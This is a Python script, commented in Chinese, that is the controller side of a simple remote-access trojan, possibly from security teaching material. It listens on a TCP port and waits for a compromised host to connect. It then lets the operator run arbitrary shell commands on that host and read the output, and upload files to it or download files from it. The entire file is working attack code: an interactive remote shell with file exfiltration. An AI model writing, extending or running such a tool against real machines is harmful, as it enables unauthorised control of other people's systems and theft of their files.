#!/usr/bin/python3
# -*- coding: utf-8 -*-


import socket
import os
import struct


# 文件上传函数
def UploadFile(conn, addr, command):
    # 把主控端的命令发送给被控端
    conn.sendall(command.encode())
    #从命令中分离出要上传文件的路径
    commandList = command.split()
    while True:
        uploadFilePath = commandList[1]
        if os.path.isfile(uploadFilePath):
            # 先传输文件信息,用来防止粘包
            # 定义文件信息,128s表示文件名长度为128bytes，l表示一个int用来表示文件大小
            # 把文件名和文件大小信息进行打包封装发送给接收端
            fileInfo = struct.pack('128sl', bytes(os.path.basename(uploadFilePath).encode('utf-8')), os.stat(uploadFilePath).st_size)
            conn.sendall(fileInfo)
            print('[+]FileInfo send success! name:{0}  size:{1}'.format(os.path.basename(uploadFilePath), os.stat(uploadFilePath).st_size))

            # 开始传输文件的内容
            print('[+]start uploading...')
            with open(uploadFilePath, 'rb') as f:
                while True:
                    # 分块多次读，防止文件过大一次性读完导致内存不足
                    data = f.read(1024)
                    if not data:
                        print("File Send Over!")
                        break
                    conn.sendall(data)
                break


# 文件下载函数
def DownloadFile(conn, addr, command):
    # 把主控端的命令发送给被控端端
    conn.sendall(command.encode())
    while True:
        # 先接收文件的信息，进行解析
        # 长度自定义，先接受文件信息的主要原因是防止粘包
        # 接收长度为128sl
        fileInfo = conn.recv(struct.calcsize('128sl'))
        if fileInfo:
            # 按照同样的格式（128sl）进行拆包
            fileName, fileSize = struct.unpack('128sl', fileInfo)
            # 要把文件名后面的多余无意义的空字符去除
            fileName = fileName.decode().strip('\00')
            # 定义上传文件的存放路径   ./表示当前目录下
            newFilename = os.path.join('./', fileName)
            print('Fileinfo Receive over! name:{0}  size:{1}'.format(fileName, fileSize))

            # 接下来开始接收文件的内容
            # 表示已经接收到的文件内容大小
            recvdSize = 0
            print('start receiving...')
            with open(newFilename, 'wb') as f:
                # 分次分块写入
                while not recvdSize == fileSize:
                    if fileSize - recvdSize > 1024:
                        data = conn.recv(1024)
                        f.write(data)
                        recvdSize += len(data)
                    else:
                        # 剩下内容不足1024时，则把剩下的全部内容都接收写入
                        data = conn.recv(fileSize - recvdSize)
                        f.write(data)
                        recvdSize = fileSize
                        break
            print("File Receive over!!!")
        break


# 文件传输函数
def TransferFiles(conn, addr):
    print("Usage: method filepath")
    print("Example: upload /root/ms08067 | download /root/ms08067")
    while True:
        command = input("[TransferFiles]>>> ")
        #对输入进行命令和参数分割
        commandList = command.split()
        if commandList[0] == 'exit':
            # 主控端退出相应模块时，也要通知被控端退出对应的功能模块
            conn.sendall('exit'.encode())
            break
        # 若方法为download表示主控端端需要获取被控端的文件
        if commandList[0] == 'download':
            DownloadFile(conn, addr, command)
        if commandList[0] == 'upload':
            UploadFile(conn, addr, command)


# 命令执行函数
def ExecCommand(conn, addr):
    while True:
        command = input("[ExecCommand]>>> ")
        if command == 'exit':
            # 主控端退出相应模块时，也要通知客户端退出对应的功能模块
            conn.sendall('exit'.encode())
            break
        conn.sendall(command.encode())
        result = conn.recv(10000).decode()
        print(result)


if __name__ == '__main__':
    # 主控端监听地址
    serverIP = '127.0.0.1'
    # 主控端监听端口
    serverPort = 6666
    serverAddr = (serverIP, serverPort)

    # 主控端开始监听
    try:
        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serverSocket.bind(serverAddr)
        serverSocket.listen(1)
    except socket.error as message:
        print(message)
        os._exit(0)

    print("[*]Server is up!!!")

    conn, addr = serverSocket.accept()
    # 接收并打印上线主机的主机名，地址和端口
    hostName = conn.recv(1024)
    print("[+]Host is up! \n ============ \n name:{0} ip:{1} \n port:{2} \n ============ \n".format(bytes.decode(hostName), addr[0], addr[1]))
    try:
        while True:
            print("Functional selection:\n")
            print("[1]ExecCommand \n[2]TransferFiles\n")
            choice = input('[None]>>> ')
            # 给被控端发送指令，主控端进入相应的功能模块
            if choice == '1':
                # 发送的命令为str型,需要encode转换为bytes型
                conn.sendall('1'.encode())
                ExecCommand(conn, addr)
            elif choice == '2':
                conn.sendall('2'.encode())
                TransferFiles(conn, addr)
            elif choice == 'exit':
                conn.sendall('exit'.encode())
                serverSocket.close()
                break
    except :
        serverSocket.close()